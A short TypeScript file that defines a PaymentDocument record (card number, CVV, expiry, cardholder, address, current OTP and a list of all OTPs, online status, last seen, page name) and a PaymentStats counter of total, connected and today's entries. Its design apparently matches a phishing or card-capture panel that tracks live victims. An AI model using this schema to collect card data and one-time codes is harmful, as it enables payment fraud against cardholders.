export interface PaymentDocument {
    allOtps: string[]
    billingAddress: string
    cardNumber: string
    cardholderName: string
    city: string
    country: string
    createdDate: string
    cvv: string
    expiryDate: string
    id: string
    lastSeen: {
      sv: string
    }
    online: boolean
    otp: string
    pagename: string
    zipCode: string
    isHidden?: string
  }
  
  
  export interface PaymentStats {
    total: number
    connected: number
    today: number
  }
  